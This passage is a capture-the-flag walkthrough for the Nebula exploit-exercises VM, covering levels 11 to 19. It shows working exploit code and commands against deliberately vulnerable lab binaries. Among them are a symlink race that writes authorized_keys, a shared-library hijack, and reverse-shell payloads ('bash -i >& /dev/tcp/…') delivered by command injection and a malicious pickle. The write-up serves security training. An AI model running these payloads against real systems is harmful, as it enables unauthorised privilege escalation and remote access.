Our aim now is to write a SSH public key to the
`/home/flag11/.ssh/authorized_keys` file. We use `ssh-keygen` to generate a
SSH keypair for the level11 user. Our exploit is written in C to ensure that
our `random` function is the same as the one used in the `flag11` binary.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <sys/mman.h>

void getrand(char **path, int pid, int time)
{
    char *tmp;
    int fd;

    srandom(time);

    tmp = getenv("TEMP");

    asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
        'A' + (random() % 26), '0' + (random() % 10),
        'a' + (random() % 26), 'A' + (random() % 26),
        '0' + (random() % 10), 'a' + (random() % 26));
}

int main(int argc, char **argv)
{
    char line[256];
    char buf[2048] = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDiXL8q1ehvJanDxk4CpzrFHJmCM6MMPWkqPYlxAd1NZ7m9djA3Yn/zlubEbYDoPkYlq3f8eqwgzN6PQs3OhynDwzvZkBwBd30bMnPdCp4J3tPvM/UGOYV5R9pmwnMaUzLSdbT718AYGHTaWiX9j6nOYjMCg1S/zUIXykD+xlsUHcDrqs1KUHGZADoSPSkV5uEtFNqJ6I3BXaUtPm5JzwI8BF0BO3+tIcnTT8aWARLGZ/wZqx50Ia9gX0b3AM1brAStJfKy3dInRy9dFgmopZOazDI/1y0rmhSw+672zex6UVY+7tLEsOKp1bK+GHCWgpOxJHud8RTIUGpl4lEgjgNr level11@nebula";

    int pid;
    int fd;
    char *path;
    FILE* stream;

    pid = getpid() + 1;
    getrand(&path, pid, time(NULL));
    symlink("/home/flag11/.ssh/authorized_keys", path);
    fprintf(stdout, "Content-Length: 2048\n%s", buf);
}
```

Our exploit works by predicting the file that will be used by the `flag11`
binary, abusing the fact that Linux assigns PID numbers sequentially, and
symlinks that file to the `/home/flag11/.ssh/authorized_keys` file. We are able
to do this because permissions are not actually checked during the creation
of symbolic links.

Full credits to [@graugans][nebula-11-gist] for the idea.

```shell
level11@nebula:~$ gcc -o /home/level11/exploit /home/level11/exploit.c
level11@nebula:~$ /home/level11/exploit | /home/flag11/flag11
blue = 2048, length = 2048, pink = 395
blue = 1653, length = 2048, pink = 0
flag11: fread fail(blue = 1653, length = 2048): Operation not permitted
level11@nebula:~$ ls -lah /home/flag11/.ssh
total 4.0K
drwxr-xr-x 1 flag11 flag11   60 2018-01-01 04:28 .
drwxr-x--- 1 flag11 level11  60 2012-08-20 18:58 ..
-rw------- 1 flag11 level11 395 2018-01-01 04:28 authorized_keys
```

Once we have written the `authorized_keys` file, we are able to SSH in
as the flag11 user.

```shell
level11@nebula:~$ ssh -i /home/level11/.ssh/id_rsa flag11@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ECDSA key fingerprint is ea:8d:09:1d:f1:69:e6:1e:55:c7:ec:e9:76:a1:37:f0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '127.0.0.1' (ECDSA) to the list of known hosts.

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.
flag11@nebula:~$ whoami
flag11
flag11@nebula:~$ id
uid=988(flag11) gid=988(flag11) groups=988(flag11)
flag11@nebula:~$ getflag
You have successfully executed getflag on a target account
```

Given that the `flag11` binary drops privileges, I am not able to get the
second method of exploiting this level working. If anyone does, do drop me
an email letting me know how!

# level 12

We are given the below source code.

```lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 50001))

function hash(password)
  prog = io.popen("echo "..password.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local line, err = client:receive()
  if not err then
      print("trying " .. line) -- log from where ;\
      local h = hash(line)

      if h ~= "4754a4f4bd5787accd33de887b9250a0691dd198" then
          client:send("Better luck next time\n");
      else
          client:send("Congrats, your token is 413**CARRIER LOST**\n")
      end

  end

  client:close()
end
```

This is a command injection very similar to level 07 that can be exploited in
the same way. The lua script reads a line from the socket and passes it
directly to the `io.popen()` function call.

We start by setting up a netcat listener.

```shell
ncat -nlvp 8000

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5F3F 6ECC 75A2 4FF9 C358 2913 09FF 5C75 6D50 F5A4
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
```

We make a telnet request and send our injected command.

```shell
level12@nebula:/home/flag12$ telnet localhost 50001
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
Password: echo asdf; bash -i >& /dev/tcp/192.168.144.1/8000 0>&1; echo asdf
```

We get a reverse shell.

```shell
Ncat: Connection from 192.168.144.191.
Ncat: Connection from 192.168.144.191:40283.
bash: no job control in this shell
flag12@nebula:/$ whoami
whoami
flag12
flag12@nebula:/$ id
id
uid=987(flag12) gid=987(flag12) groups=987(flag12)
flag12@nebula:/$ getflag
getflag
You have successfully executed getflag on a target account
```

# level 13

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <string.h>

#define FAKEUID 1000

int main(int argc, char **argv, char **envp)
{
  int c;
  char token[256];

  if(getuid() != FAKEUID) {
      printf("Security failure detected. UID %d started us, we expect %d\n", getuid(), FAKEUID);
      printf("The system administrators will be notified of this violation\n");
      exit(EXIT_FAILURE);
  }

  // snip, sorry :)

  printf("your token is %s\n", token);

}
```

The security check relies entirely on the `getuid()` function to return a none
`1000` value. We can break this by using `LD_PRELOAD` to load a shared object
file containing a custom `getuid()` function.

We have the following `fake.c` file:

```c
int getuid() {
    return 1000;
}
```

We compile the code as a shared object.

```shell
level13@nebula:~$ gcc -shared -fPIC -o /home/level13/fake.so /home/level13/fake.c
```

We try running the `flag13` binary with our `fake.so` preloaded.

```shell
level13@nebula:~$ LD_PRELOAD=/home/level13/fake.so /home/flag13/flag13
Security failure detected. UID 1014 started us, we expect 1000
The system administrators will be notified of this violation
```

This fails because `LD_PRELOAD` does not work with SUID binaries. Without this
security feature in place, it would be trivial to abuse any SUID binary for
privilege escalation by loading custom shared objects.

We get around this limitation by making a copy of the `flag13` binary without
the SUID bit set. This works because the binary itself contains the token and
does not rely on the SUID bit to read data from anywhere.

```shell
level13@nebula:~$ cp /home/flag13/flag13 /home/level13/flag13
level13@nebula:~$ LD_PRELOAD=/home/level13/fake.so /home/level13/flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

Like in previous levels, the string in the token file is the password for the
flag13 user.

```shell
level13@nebula:~$ su - flag13
Password:
flag13@nebula:~$ whoami
flag13
flag13@nebula:~$ id
uid=986(flag13) gid=986(flag13) groups=986(flag13)
flag13@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 14

We are told that the `/home/flag14/flag14` binary encrypts input and writes it
to standard output.

We try entering some inputs:

```shell
level14@nebula:~$ /home/flag14/flag14 -e
AAAAA
ABCDE
level14@nebula:~$ /home/flag14/flag14 -e
12345
13579
level14@nebula:~$ /home/flag14/flag14 -e
BBBBB
BCDEF
```

The cipher seems simply enough to break. It appears that each character is
shifted a number of times depending on its position within the string. The
first character is shifted 0 times, the second character is shifted 1 times,
and so on.

We write a python script, `decrypt_14.py` to reverse this encryption scheme.

```python
import sys


def decrypt(data):
    ret = []
    for pos, i in enumerate(data):
        a = ord(i)
        a -= pos
        ret.append(chr(a))

    return "".join(ret)


if __name__ == "__main__":
    print(decrypt(sys.argv[1]))
```

We run it to decrypt the token.

```shell
level14@nebula:~$ cat /home/flag14/token | xargs python decrypt_14.py
8457c118-887c-4e40-a5a6-33a25353165

```

Like in previous levels, the decrypted string in the token file is the password
for the flag14 user.

```shell
level14@nebula:~$ su - flag14
Password:
flag14@nebula:~$ whoami
flag14
flag14@nebula:~$ id
uid=985(flag14) gid=985(flag14) groups=985(flag14)
flag14@nebula:~$ getflag
You have successfully executed getflag on a target account
```

# level 15

We are told to `strace` the `/home/flag15/flag15` binary.

```shell
level15@nebula:~$ strace /home/flag15/flag15
... snip ...
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
... snip ...
```

We notice that the binary is looking for `libc.so.6` in various locations
before eventually using the one at `/lib/i386-linux-gnu/libc.so.6`.

We also notice that `/var/tmp/flag15` is writable by the level15 user. This
means that we can drop in a `libc.so.6` shared object file in `/var/tmp/flag15`
that runs some code to get us a shell.

```shell
level15@nebula:~$ ls -lah /var/tmp
total 0
drwxrwxrwt 3 root    root     29 2012-08-23 18:46 .
drwxr-xr-x 1 root    root    120 2011-12-06 22:46 ..
drwxrwxr-x 2 level15 level15   3 2012-10-31 01:38 flag15
```

Digging further into the `flag15` binary, we see that the `RPATH` is set to
`/var/tmp/flag15`. The `RPATH` is used by the dynamic linker at run time to
search for libraries. The neat thing about `RPATH` is that it is not subject
to the same security model as `LD_PRELOAD` and it works with SUID binaries.

```shell
level15@nebula:~$ objdump -p /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

... snip ...

Dynamic Section:
  NEEDED               libc.so.6
  RPATH                /var/tmp/flag15
  INIT                 0x080482c0
  FINI                 0x080484ac
  GNU_HASH             0x080481ac
  STRTAB               0x0804821c
  SYMTAB               0x080481cc
  STRSZ                0x0000005a
  SYMENT               0x00000010
  DEBUG                0x00000000
  PLTGOT               0x08049ff4
  PLTRELSZ             0x00000018
  PLTREL               0x00000011
  JMPREL               0x080482a8
  REL                  0x080482a0
  RELSZ                0x00000008
  RELENT               0x00000008
  VERNEED              0x08048280
  VERNEEDNUM           0x00000001
  VERSYM               0x08048276

Version References:
  required from libc.so.6:
    0x0d696910 0x00 02 GLIBC_2.0
```

The next step is to find out what functions for `libc.so.6` the `flag15` binary
uses so we can find an appropriate function to hook.

```shell
level15@nebula:~$ objdump -R /home/flag15/flag15

/home/flag15/flag15:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ff0 R_386_GLOB_DAT    __gmon_start__
0804a000 R_386_JUMP_SLOT   puts
0804a004 R_386_JUMP_SLOT   __gmon_start__
0804a008 R_386_JUMP_SLOT   __libc_start_main
```

`__libc_start_main` seems like a good function to hook. The purpose of the
function is to initialize the process before calling `main()` and so will be
called before anything in the program runs. This reduces the likelihood of
something going wrong with our exploit.

We write a `fake.c` and attempt to compile and use it.

```c
int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system("/bin/sh");
}
```

```shell
level15@nebula:~$ gcc -shared -fPIC -o /var/tmp/flag15/libc.so.6 /home/level15/fake.c
level15@nebula:~$ /home/flag15/flag15
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/flag15/flag15)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

To debug this error, we make a copy of the binary without the SUID bit set and
run it with `LD_DEBUG`.

```shell
level15@nebula:~$ cp /home/flag15/flag15 /home/level15/flag15
level15@nebula:~$ LD_DEBUG=all /home/level15/flag15
... snip ...
      3207:     checking for version `GLIBC_2.0' in file /var/tmp/flag15/libc.so.6 [0] required by file /home/level15/flag15 [0]
      3207:     /var/tmp/flag15/libc.so.6: error: version lookup error: no version information available (required by /home/level15/flag15) (continued)
/home/level15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /home/level15/flag15)
      3207:     checking for version `GLIBC_2.0' in file /var/tmp/flag15/libc.so.6 [0] required by file /var/tmp/flag15/libc.so.6 [0]
      3207:     /var/tmp/flag15/libc.so.6: error: version lookup error: no version information available (required by /var/tmp/flag15/libc.so.6) (continued)
/home/level15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
      3207:     checking for version `GLIBC_2.1.3' in file /var/tmp/flag15/libc.so.6 [0] required by file /var/tmp/flag15/libc.so.6 [0]
      3207:     /var/tmp/flag15/libc.so.6: error: version lookup error: no version information available (required by /var/tmp/flag15/libc.so.6) (continued)
/home/level15/flag15: /var/tmp/flag15/libc.so.6: no version information available (required by /var/tmp/flag15/libc.so.6)
      3207:
      3207:     relocation processing: /var/tmp/flag15/libc.so.6 (lazy)
      3207:     symbol=__cxa_finalize;  lookup in file=/home/level15/flag15 [0]
      3207:     symbol=__cxa_finalize;  lookup in file=/var/tmp/flag15/libc.so.6 [0]
      3207:     /var/tmp/flag15/libc.so.6: error: relocation error: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference (fatal)
/home/level15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol __cxa_finalize, version GLIBC_2.1.3 not defined in file libc.so.6 with link time reference
```

We see that we are missing the `__cxa_finalize` symbol as well as the
`GLIBC_2.0` version in our fake `libc.so.6` shared object.

```c
int __libc_start_main(int *(main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
    system("/bin/sh");
}

void __cxa_finalize(void * d) {
    return;
}
```

We also create a version script containing the following:

```text
GLIBC_2.0 {};
```

We attempt to compile and use it:

```shell
level15@nebula:~$ gcc -o /var/tmp/flag15/libc.so.6 -shared -fPIC -Wl,--version-script=/home/level15/version /home/level15/fake.c
level15@nebula:~$ /home/flag15/flag15
/home/flag15/flag15: relocation error: /var/tmp/flag15/libc.so.6: symbol system, version GLIBC_2.0 not defined in file libc.so.6 with link time reference
```

We see that the `system` symbol is not linked. We can get around this by
compiling it statically into our `libc.so.6` shared object.

```shell
level15@nebula:~$ gcc -o /var/tmp/flag15/libc.so.6 -static-libgcc -shared -fPIC -Wl,--version-script=/home/level15/version,-Bstatic /home/level15/fake.c
level15@nebula:~$ /home/flag15/flag15
sh-4.2$ whoami
flag15
sh-4.2$ id
uid=1016(level15) gid=1016(level15) euid=984(flag15) groups=984(flag15),1016(level15)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

# level 16

We are given the below source code.

```perl
#!/usr/bin/env perl

use CGI qw{param};

print "Content-type: text/html\n\n";

sub login {
  $username = $_[0];
  $password = $_[1];

  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space

  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
  foreach $line (@output) {
      ($usr, $pw) = split(/:/, $line);


      if($pw =~ $password) {
          return 1;
      }
  }

  return 0;
}

sub htmlz {
  print("<html><head><title>Login resuls</title></head><body>");
  if($_[0] == 1) {
      print("Your login was accepted<br/>");
  } else {
      print("Your login failed<br/>");
  }
  print("Would you like a cookie?<br/><br/></body></html>\n");
}

htmlz(login(param("username"), param("password")));
```

There is an obvious command injection via the `username` parameter:

```perl
  @output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

However, exploitation is complicated by the fact that all characters from "a-z"
is converted to uppercase.

```perl
  $username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space
```

We start by setting up our netcat listener as usual:

```shell
ncat -nlvp 8000

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5F3F 6ECC 75A2 4FF9 C358 2913 09FF 5C75 6D50 F5A4
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
```

Next, we write our exploit into a file whose name contains only uppercase
characters.

```shell
level16@nebula:~$ cat /tmp/EXPLOIT
bash -i >& /dev/tcp/192.168.144.1/8000 0>&1
```

Finally, we make a HTTP request with url with `` `/*/EXPLOIT` `` URL encoded
as the username parameter. This makes use of bash's wildcard expansion feature
to run the `/tmp/EXPLOIT` file without having to use non uppercase characters.

```shell
level16@nebula:~$ curl "192.168.144.192:1616/index.cgi?username=%60%2F%2A%2FEXPLOIT%60&password=asdf"
```

We obtain a shell with our listener.

```shell
Ncat: Connection from 192.168.144.192.
Ncat: Connection from 192.168.144.192:36816.
bash: no job control in this shell
flag16@nebula:/home/flag16$ whoami
whoami
flag16
flag16@nebula:/home/flag16$ id
id
uid=983(flag16) gid=983(flag16) groups=983(flag16)
flag16@nebula:/home/flag16$ getflag
getflag
You have successfully executed getflag on a target account
```

# level 17

We are given the below source code.

```python
#!/usr/bin/python

import os
import pickle
import time
import socket
import signal

signal.signal(signal.SIGCHLD, signal.SIG_IGN)

def server(skt):
  line = skt.recv(1024)

  obj = pickle.loads(line)

  for i in obj:
      clnt.send("why did you send me " + i + "?\n")

skt = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
skt.bind(('0.0.0.0', 10007))
skt.listen(10)

while True:
  clnt, addr = skt.accept()

  if(os.fork() == 0):
      clnt.send("Accepted connection from %s:%d" % (addr[0], addr[1]))
      server(clnt)
      exit(1)
```

The vulnerability in this code lies the program deserializing data it reads
from the socket via `pickle.loads()`. The pickle module should never be used
to deserialize untrusted data because it is trivial to obtain code execution.

```python
  obj = pickle.loads(line)
```

We start by setting up our netcat listener as usual:

```shell
ncat -nlvp 8000

Ncat: Version 7.60 ( https://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 5F3F 6ECC 75A2 4FF9 C358 2913 09FF 5C75 6D50 F5A4
Ncat: Listening on :::8000
Ncat: Listening on 0.0.0.0:8000
```

We use the below Python script to generate an `exploit.pickle` file that
contains our exploit.

```python
import cPickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, (("bash -i >& /dev/tcp/192.168.144.1/8000 0>&1"),))

with open("exploit.pickle", "wb") as f:
    cPickle.dump(Exploit(), f, cPickle.HIGHEST_PROTOCOL)
```

We run the below command using the generated the `exploit.pickle`.

```shell
root@kali:/mnt/hgfs/Share# cat exploit.pickle | ncat 192.168.144.192 10007
Accepted connection from 192.168.144.1:51252
```

We obtain a shell with our listener.

```shell
Ncat: Connection from 192.168.144.192.
Ncat: Connection from 192.168.144.192:36817.
bash: no job control in this shell
flag17@nebula:/$ whoami
whoami
flag17
flag17@nebula:/$ id
id
uid=982(flag17) gid=982(flag17) groups=982(flag17)
flag17@nebula:/$ getflag
getflag
You have successfully executed getflag on a target account
```

# level 18

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <getopt.h>

struct {
  FILE *debugfile;
  int verbose;
  int loggedin;
} globals;

#define dprintf(...) if(globals.debugfile) \
  fprintf(globals.debugfile, __VA_ARGS__)
#define dvprintf(num, ...) if(globals.debugfile && globals.verbose >= num) \
  fprintf(globals.debugfile, __VA_ARGS__)

#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");

  globals.loggedin = 1;

}

void notsupported(char *what)
{
  char *buffer = NULL;
  asprintf(&buffer, "--> [%s] is unsupported at this current time.\n", what);
  dprintf(what);
  free(buffer);
}

void setuser(char *user)
{
  char msg[128];

  sprintf(msg, "unable to set user to '%s' -- not supported.\n", user);
  printf("%s\n", msg);

}

int main(int argc, char **argv, char **envp)
{
  char c;

  while((c = getopt(argc, argv, "d:v")) != -1) {
      switch(c) {
          case 'd':
              globals.debugfile = fopen(optarg, "w+");
              if(globals.debugfile == NULL) err(1, "Unable to open %s", optarg);
              setvbuf(globals.debugfile, NULL, _IONBF, 0);
              break;
          case 'v':
              globals.verbose++;
              break;
      }
  }

  dprintf("Starting up. Verbose level = %d\n", globals.verbose);

  setresgid(getegid(), getegid(), getegid());
  setresuid(geteuid(), geteuid(), geteuid());

  while(1) {
      char line[256];
      char *p, *q;

      q = fgets(line, sizeof(line)-1, stdin);
      if(q == NULL) break;
      p = strchr(line, '\n'); if(p) *p = 0;
      p = strchr(line, '\r'); if(p) *p = 0;

      dvprintf(2, "got [%s] as input\n", line);

      if(strncmp(line, "login", 5) == 0) {
          dvprintf(3, "attempting to login\n");
          login(line + 6);
      } else if(strncmp(line, "logout", 6) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "shell", 5) == 0) {
          dvprintf(3, "attempting to start shell\n");
          if(globals.loggedin) {
              execve("/bin/sh", argv, envp);
              err(1, "unable to execve");
          }
          dprintf("Permission denied\n");
      } else if(strncmp(line, "logout", 4) == 0) {
          globals.loggedin = 0;
      } else if(strncmp(line, "closelog", 8) == 0) {
          if(globals.debugfile) fclose(globals.debugfile);
          globals.debugfile = NULL;
      } else if(strncmp(line, "site exec", 9) == 0) {
          notsupported(line + 10);
      } else if(strncmp(line, "setuser", 7) == 0) {
          setuser(line + 8);
      }
  }

  return 0;
}
```

We are told that there are three ways to solve this level. For the purpose of
this walkthrough, we will attempt the easiest way.

```c
#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");

  globals.loggedin = 1;

}
```

We see that the `login()` function opens the `/home/flag18/password` file
and compares the input against the contents of that file. However, the login
function succeeds no matter the input if opening the file fails. We can force
this to happen if we starve the process of available file descriptors.

```shell
level18@nebula:~$ ulimit -n
1024
```

We see that there is a limit of 1024 file descriptors per process. Looking at
the disassembly of the `flag18` binary, we see that the `fclose(fp)` function
call from the source isn't actually present in the binary. This means that
the login function consumes one file descriptor without freeing it every time
it is called.

![Hopper image](../images/nebula-18-hopper.png)

We now have our attack plan. We will call `login` 1021 times (3 file
descriptors are required for stdin, stdout and stderr) giving us a process that
has consumed 1024 file descriptors, call `login` again which will succeed
before calling `shell` to `execve` our shell.

```shell
level18@nebula:~$ python -c "print 'login asdf\n' * 1022" > commands
level18@nebula:~$ python -c "print 'shell\n'" >> commands
level18@nebula:~$ cat commands | /home/flag18/flag18
/home/flag18/flag18: error while loading shared libraries: libncurses.so.5: cannot open shared object file: Error 24
```

This fails because running `execve` itself requires a file descriptor. This
means that we need to free up a file descriptor after calling `login` and
before calling `shell`. Conveniently, the `closelog` command does just that.

Our modified attack plan will be to call `login` 1020 times (3 file descriptors
for stdin, stdout and stderr plus 1 file descriptor for the debug file) giving
us a process that has consumed 1024 file descriptors. We will call `login`
again which will succeed, then we will call `closelog` that closes the debug
file, freeing up a file descriptor. Finally, we will call `execve` to obtain
our shell.

```shell
level18@nebula:~$ python -c "print 'login asdf\n' * 1021" > commands
level18@nebula:~$ python -c "print 'closelog\n'" >> commands
level18@nebula:~$ python -c "print 'shell\n'" >> commands
level18@nebula:~$ cat commands | /home/flag18/flag18 -d /dev/tty
Starting up. Verbose level = 0
logged in successfully (without password file)
/home/flag18/flag18: -d: invalid option
Usage:  /home/flag18/flag18 [GNU long option] [option] ...
        /home/flag18/flag18 [GNU long option] [option] script-file ...
GNU long options:
        --debug
        --debugger
        --dump-po-strings
        --dump-strings
        --help
        --init-file
        --login
        --noediting
        --noprofile
        --norc
        --posix
        --protected
        --rcfile
        --restricted
        --verbose
        --version
Shell options:
        -irsD or -c command or -O shopt_option          (invocation only)
        -abefhkmnptuvxBCHP or -o option
```

This fails because `argv` is passed to `/bin/sh` during the `execve` function
call and `/bin/sh` does not recognize the `-d` option present in our `argv`.

```c
execve("/bin/sh", argv, envp);
```

Adding `--rcfile` or `--init-file` flag pointing to a bogus file seems
sufficient to bypass this check.

```shell
level18@nebula:~$ cat commands | /home/flag18/flag18 --rcfile /dev/null -d /dev/tty
/home/flag18/flag18: invalid option -- '-'
/home/flag18/flag18: invalid option -- 'r'
/home/flag18/flag18: invalid option -- 'c'
/home/flag18/flag18: invalid option -- 'f'
/home/flag18/flag18: invalid option -- 'i'
/home/flag18/flag18: invalid option -- 'l'
/home/flag18/flag18: invalid option -- 'e'
Starting up. Verbose level = 0
logged in successfully (without password file)
whoami
flag18
id
uid=981(flag18) gid=1019(level18) groups=981(flag18),1019(level18)
getflag
You have successfully executed getflag on a target account
```

# level 19

We are given the below source code.

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>

int main(int argc, char **argv, char **envp)
{
  pid_t pid;
  char buf[256];
  struct stat statbuf;

  /* Get the parent's /proc entry, so we can verify its user id */

  snprintf(buf, sizeof(buf)-1, "/proc/%d", getppid());

  /* stat() it */

  if(stat(buf, &statbuf) == -1) {
      printf("Unable to check parent process\n");
      exit(EXIT_FAILURE);
  }

  /* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }

  printf("You are unauthorized to run this program\n");
}
```

The program checks if the parent PID belongs to root and starts the shell
only if it does.

The key to bypassing this check is the fact that on old Linux systems
(pre 3.4 kernel) the PPID of an orphaned process is set to the `init`
process which is owned by the root user.

```shell
level19@nebula:~$ uname -a
Linux nebula 3.0.0-12-generic #20-Ubuntu SMP Fri Oct 7 14:50:42 UTC 2011 i686 i686 i386 GNU/Linux
```

We simply have to write a program that executes the `flag19` binary and kills
the parent process before the `flag19` binary runs.

First, we prepare our `shell.c`:

```c
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {
  gid_t gid;
  uid_t uid;

  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/bin/bash");
}
```

Next, we write our exploit code that forks a child process, sleeps the child
process until the parent process exits, then runs the `flag19` binary to
compile our `shell.c` code.

```c
#include <sys/types.h>
#include <unistd.h>

int main(int argc, char **argv, char **envp) {

    pid_t child = fork();
    if (child == 0) {
        sleep(3);
        char *args[] = {"/bin/sh", "-c", "gcc /home/level19/shell.c -o /home/flag19/shell; chmod 4777 /home/flag19/shell", NULL};
        execve("/home/flag19/flag19", args, envp);
    }

    return 0;
}
```

We compile and run our exploit code.

```shell
level19@nebula:~$ gcc -o /home/level19/exploit /home/level19/exploit.c
level19@nebula:~$ /home/level19/exploit
```

After a few seconds, we see a `/home/flag19/shell` binary.

```shell
level19@nebula:~$ ls -lah /home/flag19
total 21K
drwxr-x--- 1 flag19 level19   60 2017-12-27 22:56 .
drwxr-xr-x 1 root   root     260 2012-08-27 07:18 ..
-rw-r--r-- 1 flag19 flag19   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag19 flag19  3.3K 2011-05-18 02:54 .bashrc
-rwsr-x--- 1 flag19 level19 7.4K 2011-11-20 21:22 flag19
-rw-r--r-- 1 flag19 flag19   675 2011-05-18 02:54 .profile
-rwsrwxrwx 1 flag19 level19 7.2K 2017-12-27 22:56 shell
```

Running it gets us a shell.

```shell
level19@nebula:~$ /home/flag19/shell
flag19@nebula:~$ whoami
flag19
flag19@nebula:~$ id
uid=980(flag19) gid=1020(level19) groups=980(flag19),1020(level19)
flag19@nebula:~$ getflag
You have successfully executed getflag on a target account
```

[exploit-exercises]: https://exploit-exercises.com
[gnu-coreutils-env]: https://www.gnu.org/software/coreutils/manual/html_node/env-invocation.html
[pcre-modifier]: http://php.net/manual/en/reference.pcre.pattern.modifiers.php
[nebula-11-gist]: https://gist.github.com/graugans/88e6f54c862faec8b3d4bf5789ef0dd9#file-nebula-level11-md
